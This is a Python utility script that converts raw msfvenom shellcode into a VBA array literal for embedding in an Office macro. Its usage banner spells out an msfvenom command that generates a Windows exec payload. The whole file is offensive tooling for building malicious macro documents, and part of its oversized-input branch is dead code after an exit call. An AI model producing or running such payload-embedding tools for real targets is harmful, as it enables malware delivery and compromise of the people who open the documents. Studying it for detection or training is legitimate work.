import sys

print("This program takes a binary and encodes it to an array suitable for a vba macro. Use the msfvenom `-f raw` switch.")
print("Example:\n\tmsfvenom -p windows/exec -f raw -o ~/raw.bin CMD='cmd.exe'\n\tpython bin_to_vbappArray.py ~/raw.bin\n\n")
with open(sys.argv[1], 'rb') as f:
    data = f.read()
    sz = len(data)
    if sz // 200  < 25:
        print(f"[+] Formatting {sz} bytes to a VB Application int array. ")
        print("buf = Array(", end='')
        byte_cnt = 1
        line_cnt = 1
        for byte in data:
            if byte_cnt % 200  == 0:
                if line_cnt == 25:
                    print(")\nbuf += ")
                print(" _")
                line_cnt += 1

            byte_cnt += 1
            if byte_cnt == sz+1:
                print(f'{int(byte)}', end=')\n')
            else:
                print(f'{int(byte)},', end='')
    else :
        print(f"Sorry, the max size I can format is {200 *25}")
        print(f"There's no easy way to pump {sz} bytes into a VBA array. You'll have to use multi-dimensional arrays or fancy array concatenation.")
        exit()
        #  There is a maximum of 65535 characters in a physical line of source code, so we'll put a max of 65500 chars per line
        # each byte has potential to be a max of 4 chars in source-code (3 for the int, then the comma)
        max_bytes = 65500//4
        lines_needed = sz // max_bytes
        lines_needed = lines_needed if lines_needed > 0 else 1

        # max of 25 physical lines joined with line-continuation characters to make one logical line
        if lines_needed > 25:
            print(f"There's no easy way to pump {sz} bytes into a VBA array. You'll have to use multi-dimensional arrays or fancy array concatenation.")
            exit()
        
        lines = [data[i*max_bytes: (i*max_bytes)+max_bytes] for i in range(lines_needed)]
        print("buf = Array(", end='')
        for line in lines:
            for byte in line:
                print(f'{int(byte)},', end='')
            print(' _')
        print(')')
     
        